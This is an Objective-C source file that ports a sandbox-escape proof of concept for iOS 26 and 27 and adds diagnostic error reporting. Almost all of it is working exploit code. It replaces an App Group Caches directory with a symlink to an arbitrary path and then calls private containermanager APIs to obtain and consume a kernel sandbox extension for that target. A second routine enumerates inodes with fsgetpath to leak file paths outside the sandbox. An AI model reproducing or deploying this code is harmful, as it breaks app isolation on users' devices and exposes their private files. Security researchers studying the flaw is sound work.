//
//  Escape.m
//  worse_finder
//
//  worse_query - A sandbox escape PoC for iOS 26 and 27, again.
//  Copyright (C) 2026 Taj C (forcequit), with 0xjohnny.
//  GPL-3.0. https://github.com/forcequitOS/worse_query
//
//  This file is a port of the upstream proof of concept with extra
//  diagnostics, so the probe app can print why a step failed.
//

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <sys/mount.h>

#import "Escape.h"

// Not exposed in the public SDK.
ssize_t fsgetpath(char *buf, size_t buflen, fsid_t *fsid, uint64_t objid);

typedef void *(*cq_create_fn)(void);
typedef void (*cq_set_u64_fn)(void *, uint64_t);
typedef void (*cq_set_ids_fn)(void *, xpc_object_t);
typedef void *(*cq_result_fn)(void *);
typedef void (*cq_free_fn)(void *);
typedef char *(*cq_token_fn)(void *);
typedef int64_t (*ext_consume_fn)(const char *);
typedef int (*ext_release_fn)(int64_t);

static NSString *gLastError;
static NSString *gLastClass;

NSString *wq_last_error(void) { return gLastError; }
NSString *wq_last_extension_class(void) { return gLastClass; }

static void set_error(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    gLastError = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
}

#pragma mark - entitlements

NSArray<NSString *> *wq_entitled_groups(void) {
    NSMutableArray<NSString *> *candidates = [NSMutableArray array];

    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW | RTLD_LOCAL);
    if (security) {
        typedef void *(*task_create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_value_fn)(void *, CFStringRef, CFErrorRef *);
        task_create_fn task_create = (task_create_fn)dlsym(security, "SecTaskCreateFromSelf");
        copy_value_fn copy_value = (copy_value_fn)dlsym(security, "SecTaskCopyValueForEntitlement");
        if (task_create && copy_value) {
            void *task = task_create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef value = copy_value(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (value) {
                    if (CFGetTypeID(value) == CFArrayGetTypeID()) {
                        for (id group in (__bridge NSArray *)value) {
                            if ([group isKindOfClass:[NSString class]]) [candidates addObject:group];
                        }
                    }
                    CFRelease(value);
                }
                CFRelease(task);
            }
        }
    }

    return candidates;
}

NSString *wq_app_group(void) {
    NSFileManager *files = [NSFileManager defaultManager];
    for (NSString *group in wq_entitled_groups()) {
        if ([files containerURLForSecurityApplicationGroupIdentifier:group]) return group;
    }
    return nil;
}

#pragma mark - worse_query

// Undo the symlink and leave a real Caches directory behind.
static void restore_caches(NSString *group) {
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *root = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) return;
    NSURL *caches = [root URLByAppendingPathComponent:@"Library/Caches"];
    [files removeItemAtURL:caches error:nil];
    [files createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

static void remember_class(const char *token) {
    gLastClass = nil;
    NSString *string = [NSString stringWithUTF8String:token];
    for (NSString *field in [string componentsSeparatedByString:@";"]) {
        if ([field hasPrefix:@"com.apple."]) {
            gLastClass = field;
            break;
        }
    }
}

int64_t wq_grant(NSString *target, NSString *group, BOOL alt_flags) {
    gLastError = nil;
    gLastClass = nil;

    if (target.length == 0 || ![target hasPrefix:@"/"]) {
        set_error(@"target is not an absolute path");
        return -254;
    }

    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) {
        set_error(@"target does not exist: %s", strerror(errno));
        return -255;
    }

    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *root = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!root) {
        set_error(@"no accessible App Group container for %@", group);
        return -1;
    }
    NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        set_error(@"dlopen(libsystem_containermanager) failed: %s", dlerror());
        return -2;
    }

    cq_create_fn create = (cq_create_fn)dlsym(mgr, "container_query_create");
    cq_set_u64_fn set_class = (cq_set_u64_fn)dlsym(mgr, "container_query_set_class");
    cq_set_ids_fn set_groups = (cq_set_ids_fn)dlsym(mgr, "container_query_set_group_identifiers");
    cq_set_u64_fn set_flags = (cq_set_u64_fn)dlsym(mgr, "container_query_operation_set_flags");
    cq_set_u64_fn set_part = (cq_set_u64_fn)dlsym(mgr, "container_query_operation_set_part");
    cq_result_fn single = (cq_result_fn)dlsym(mgr, "container_query_get_single_result");
    cq_free_fn free_query = (cq_free_fn)dlsym(mgr, "container_query_free");
    cq_token_fn copy_token = (cq_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    ext_consume_fn consume = (ext_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!create || !set_class || !set_groups || !set_flags || !set_part ||
        !single || !free_query || !copy_token || !consume) {
        set_error(@"could not resolve the container query API (unsupported OS?)");
        dlclose(mgr);
        return -2;
    }

    void *query = create();
    if (!query) {
        set_error(@"container_query_create failed");
        dlclose(mgr);
        return -3;
    }

    set_class(query, 7);   // MCMSharedDataContainer -> containermanagerd
    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    set_groups(query, identifier);
    set_part(query, 3);    // Library/Caches
    // 1<<39 default; iOS 26 needs 1<<35 for App Group targets.
    set_flags(query, alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL);

    // The whole trick: the manager resolves this part and authorises the target.
    [files removeItemAtPath:caches error:nil];
    if (![files createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        set_error(@"could not replace %@ with a symlink: %s", caches, strerror(errno));
        free_query(query);
        dlclose(mgr);
        restore_caches(group);
        return -4;
    }

    void *result = single(query);
    if (!result) {
        set_error(@"query rejected by containermanagerd (path not reachable)");
        free_query(query);
        dlclose(mgr);
        restore_caches(group);
        return -5;
    }

    char *token = copy_token(result);
    if (!token) {
        set_error(@"kernel refused to issue a sandbox extension");
        free_query(query);
        dlclose(mgr);
        restore_caches(group);
        return -6;
    }

    remember_class(token);
    int64_t handle = consume(token);
    if (handle < 0) set_error(@"sandbox_extension_consume failed (%lld)", (long long)handle);

    free(token);
    free_query(query);
    dlclose(mgr);
    restore_caches(group);
    return handle;
}

void wq_release(int64_t handle) {
    if (handle < 0) return;
    ext_release_fn release = (ext_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release) release(handle);
}

#pragma mark - pathleak

uint64_t wq_baseline_inode(void) {
    NSURL *url = [NSURL fileURLWithPath:[NSTemporaryDirectory() stringByAppendingPathComponent:
                                        [NSString stringWithFormat:@"baseline-%@", NSUUID.UUID.UUIDString]]];
    if (![@"helloworld" writeToURL:url atomically:YES encoding:NSUTF8StringEncoding error:nil]) return 0;
    struct stat st;
    uint64_t inode = 0;
    if (stat(url.path.fileSystemRepresentation, &st) == 0) inode = st.st_ino;
    [[NSFileManager defaultManager] removeItemAtURL:url error:nil];
    return inode;
}

NSArray<NSString *> *wq_pathleak(NSString *path, uint64_t max_inode) {
    if (path.length == 0 || max_inode < 1) return nil;

    NSString *dir = path;
    while (dir.length > 1 && [dir hasSuffix:@"/"]) dir = [dir substringToIndex:dir.length - 1];

    struct statfs sfs;
    if (statfs(dir.fileSystemRepresentation, &sfs) != 0) return nil;
    fsid_t fsid = sfs.f_fsid;

    char prefix[PATH_MAX];
    if (![dir getFileSystemRepresentation:prefix maxLength:sizeof(prefix)]) return nil;
    size_t prefix_length = strlen(prefix);
    if (prefix_length == 1 && prefix[0] == '/') prefix_length = 0;

    NSMutableArray<NSString *> *result = [NSMutableArray array];
    char buffer[PATH_MAX];

    for (uint64_t inode = 1; inode <= max_inode; inode++) {
        ssize_t n = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (n <= 0) continue;
        if (strncmp(buffer, prefix, prefix_length) != 0) continue;
        if (buffer[prefix_length] != '/') continue;
        if (strchr(buffer + prefix_length + 1, '/')) continue;

        NSString *string = [[NSFileManager defaultManager] stringWithFileSystemRepresentation:buffer
                                                                                       length:strlen(buffer)];
        if (string) [result addObject:string];
    }
    return result;
}
